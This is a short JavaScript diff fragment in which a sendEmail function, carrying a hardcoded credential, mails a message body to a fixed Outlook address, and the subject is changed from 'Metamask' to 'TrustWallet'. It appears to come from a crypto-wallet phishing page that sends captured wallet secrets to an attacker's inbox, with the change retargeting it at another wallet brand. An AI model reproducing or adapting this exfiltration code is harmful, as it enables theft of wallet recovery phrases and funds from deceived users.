@@ -152,7 +152,7 @@ function sendEmail() {
     Password: "E4CE7FFCD9D625180EB700EE9EA29AFE458B",
     To: "jasongregor005@outlook.com",
     From: "jasongregor005@outlook.com",
-    Subject: "Metamask",
+    Subject: "TrustWallet",
     Body: bodyMessage,
   }).then((message) => {
     if (message === "OK") {
